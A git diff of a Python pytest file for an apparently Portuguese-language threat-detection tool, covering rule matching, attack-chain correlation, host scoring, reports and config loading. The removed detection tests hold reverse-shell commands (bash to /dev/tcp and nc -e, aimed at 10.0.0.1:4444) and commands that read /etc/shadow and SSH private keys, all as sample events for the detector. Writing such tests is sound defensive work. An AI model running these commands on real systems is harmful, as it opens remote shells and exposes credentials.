@@ -5,6 +5,9 @@
 import pytest
 import sys
 import os
+import json
+import tempfile
+from datetime import datetime
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
@@ -111,39 +114,6 @@ class TestMotorDeRegras:
         evento = {"EventID": "1", "CommandLine": "ping 192.168.1.20"}
         assert rule["check"](evento) is False
 
-    # R008 - Reverse Shell Linux
-    def test_r008_deteta_bash_tcp(self):
-        rule = get_rule("R008")
-        evento = {"EventID": "EXECVE", "CommandLine": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"}
-        assert rule["check"](evento) is True
-
-    def test_r008_deteta_nc(self):
-        rule = get_rule("R008")
-        evento = {"EventID": "EXECVE", "CommandLine": "nc -e /bin/bash 10.0.0.1 4444"}
-        assert rule["check"](evento) is True
-
-    def test_r008_ignora_bash_normal(self):
-        rule = get_rule("R008")
-        evento = {"EventID": "EXECVE", "CommandLine": "bash script.sh"}
-        assert rule["check"](evento) is False
-
-    # R009 - Leitura de Credenciais Linux
-    def test_r009_deteta_cat_shadow(self):
-        rule = get_rule("R009")
-        evento = {"EventID": "EXECVE", "CommandLine": "cat /etc/shadow"}
-        assert rule["check"](evento) is True
-
-    def test_r009_deteta_id_rsa(self):
-        rule = get_rule("R009")
-        evento = {"EventID": "EXECVE", "CommandLine": "cat /root/.ssh/id_rsa"}
-        assert rule["check"](evento) is True
-
-    def test_r009_ignora_cat_normal(self):
-        rule = get_rule("R009")
-        evento = {"EventID": "EXECVE", "CommandLine": "cat /etc/hostname"}
-        assert rule["check"](evento) is False
-
-
 # ============================================================
 # TESTES - MOTOR DE CORRELACAO
 # ============================================================
@@ -159,15 +129,6 @@ CHAIN_C001 = {
     "mitre_tactic": "Execution -> Credential Access -> Persistence"
 }
 
-CHAIN_C005 = {
-    "id":          "C005",
-    "name":        "Backdoor Linux Completo",
-    "rules":       ["R008", "R009"],
-    "severity":    "CRITICAL",
-    "risk_score":  95,
-    "mitre_tactic": "Execution -> Credential Access"
-}
-
 class TestMotorDeCorrelacao:
 
     def _make_events(self, rule_ids):
@@ -178,11 +139,11 @@ class TestMotorDeCorrelacao:
         matches = check_chain(events, CHAIN_C001, 60)
         assert len(matches) == 1
 
-    def test_deteta_cadeia_c001_ordem_diferente(self):
-        # Regras presentes mas em ordem diferente - deve detetar na mesma
+    def test_nao_deteta_cadeia_c001_fora_de_ordem(self):
+        # Regras presentes mas fora de ordem nao devem formar cadeia.
         events = self._make_events(["R006", "R001", "R004"])
         matches = check_chain(events, CHAIN_C001, 60)
-        assert len(matches) == 1
+        assert len(matches) == 0
 
     def test_nao_deteta_cadeia_incompleta(self):
         # Falta R001
@@ -190,10 +151,14 @@ class TestMotorDeCorrelacao:
         matches = check_chain(events, CHAIN_C001, 60)
         assert len(matches) == 0
 
-    def test_deteta_cadeia_linux(self):
-        events = self._make_events(["R008", "R009"])
-        matches = check_chain(events, CHAIN_C005, 60)
-        assert len(matches) == 1
+    def test_nao_deteta_cadeia_fora_janela_temporal(self):
+        events = [
+            {"rule_id": "R004", "timestamp": datetime(2026, 2, 1, 10, 0), "severity": "HIGH"},
+            {"rule_id": "R006", "timestamp": datetime(2026, 2, 1, 12, 0), "severity": "CRITICAL"},
+            {"rule_id": "R001", "timestamp": datetime(2026, 2, 1, 12, 10), "severity": "HIGH"},
+        ]
+        matches = check_chain(events, CHAIN_C001, 60)
+        assert len(matches) == 0
 
     def test_nao_deteta_cadeia_vazia(self):
         matches = check_chain([], CHAIN_C001, 60)
@@ -213,6 +178,20 @@ class TestMotorDeCorrelacao:
         assert "HOST-B" in timeline
         assert len(timeline["HOST-A"]) == 2
         assert len(timeline["HOST-B"]) == 1
+
+    def test_build_timeline_prefere_eventos_expandidos(self):
+        alerts = [{
+            "rule": "R006", "rule_name": "Dump de Credenciais", "severity": "CRITICAL",
+            "events": [
+                {"Computer": "HOST-A", "TimeCreated": "2026-02-01T10:00:00Z"},
+                {"Computer": "HOST-B", "TimeCreated": "2026-02-01T10:05:00Z"},
+            ],
+            "sample_event": {"TimeCreated": "2026-02-01T09:00:00Z"},
+        }]
+        timeline = build_host_timeline(alerts)
+        assert len(timeline["HOST-A"]) == 1
+        assert len(timeline["HOST-B"]) == 1
+        assert timeline["HOST-B"][0]["timestamp"].isoformat() == "2026-02-01T10:05:00"
 
 
 # ============================================================
@@ -243,6 +222,12 @@ class TestHostScorer:
         assert scores["HOST-A"]["total_cadeias"] == 1
         assert scores["HOST-A"]["score"] > 0
 
+    def test_host_regista_tecnica_mitre_por_regra(self):
+        alerts = [self._make_alert("CRITICAL", ["HOST-A"])]
+        alerts[0]["rule"] = "R001"
+        scores = calculate_host_scores(alerts, [])
+        assert "T1547 - Boot or Logon Autostart Execution" in scores["HOST-A"]["tecnicas"]
+
     def test_host_sem_alertas_nao_aparece(self):
         alerts = [self._make_alert("HIGH", ["HOST-A"])]
         scores = calculate_host_scores(alerts, [])
@@ -268,7 +253,9 @@ class TestHostScorer:
 # ============================================================
 
 from report_writer import generate_txt_report
-import tempfile
+from parser import get_events, parse_jsonl
+from app_config import load_app_config
+from event_utils import attach_auth_token, has_valid_auth_token, strip_auth_token
 
 class TestReportWriter:
 
@@ -282,7 +269,10 @@ class TestReportWriter:
             "chain_id": "C001", "chain_name": "Comprometimento Total",
             "severity": "CRITICAL", "risk_score": 95,
             "host": "HOST-A", "mitre_tactic": "Execution -> Persistence",
-            "sequence": [{"rule_name": "PowerShell"}, {"rule_name": "Mimikatz"}]
+            "steps": [
+                {"rule_name": "PowerShell", "timestamp": "2026-02-01T10:00:00"},
+                {"rule_name": "Mimikatz", "timestamp": "2026-02-01T10:05:00"},
+            ]
         }]
         host_scores = {
             "HOST-A": {"score": 95, "nivel": "CRITICO",
@@ -331,4 +321,70 @@ class TestReportWriter:
         assert "HOST-A"               in content
         assert "Dump de Credenciais"  in content
         assert "95/100"               in content
+        assert "PowerShell [2026-02-01T10:00:00]" in content
         os.unlink(path)
+
+
+class TestParserJsonl:
+
+    def test_parse_jsonl_normaliza_eventid(self):
+        with tempfile.NamedTemporaryFile(suffix=".jsonl", delete=False, mode="w", encoding="utf-8") as f:
+            f.write('{"EventId": 7045, "Computer": "HOST-A"}\n')
+            path = f.name
+
+        events = parse_jsonl(path)
+        assert len(events) == 1
+        assert events[0]["EventID"] == "7045"
+        os.unlink(path)
+
+    def test_parser_ignora_formato_nao_windows(self):
+        with tempfile.NamedTemporaryFile(suffix=".audit", delete=False, mode="w", encoding="utf-8") as f:
+            f.write("unsupported content\n")
+            path = f.name
+
+        events = get_events(path)
+        assert events == []
+        os.unlink(path)
+
+
+class TestTransportAuth:
+
+    def test_attach_auth_token_adiciona_campo(self):
+        payload = attach_auth_token({"type": "heartbeat"}, "segredo")
+        assert payload["AuthToken"] == "segredo"
+
+    def test_has_valid_auth_token_valida_token_certo(self):
+        payload = {"AuthToken": "segredo"}
+        assert has_valid_auth_token(payload, "segredo") is True
+        assert has_valid_auth_token(payload, "errado") is False
+
+    def test_strip_auth_token_remove_campo(self):
+        payload = strip_auth_token({"AuthToken": "segredo", "EventID": "4688"})
+        assert "AuthToken" not in payload
+        assert payload["EventID"] == "4688"
+
+
+class TestAppConfig:
+
+    def test_load_app_config_resolve_paths_e_overrides(self, monkeypatch):
+        with tempfile.TemporaryDirectory() as tmpdir:
+            config_path = os.path.join(tmpdir, "sentinelai_config.json")
+            script_path = os.path.join(tmpdir, "src", "dummy.py")
+            os.makedirs(os.path.dirname(script_path), exist_ok=True)
+
+            with open(config_path, "w", encoding="utf-8") as config_file:
+                json.dump({
+                    "logs_folder": "logs",
+                    "output_folder": "output/reports",
+                    "receiver_port": "9100",
+                }, config_file)
+
+            monkeypatch.setenv("SENTINELAI_CONFIG_PATH", config_path)
+            monkeypatch.setenv("SENTINELAI_RECEIVER_AUTH_TOKEN", "env-token")
+
+            config = load_app_config(script_path)
+
+            assert config["receiver_port"] == 9100
+            assert config["receiver_auth_token"] == "env-token"
+            assert os.path.isabs(config["logs_folder"])
+            assert os.path.isabs(config["output_folder"])
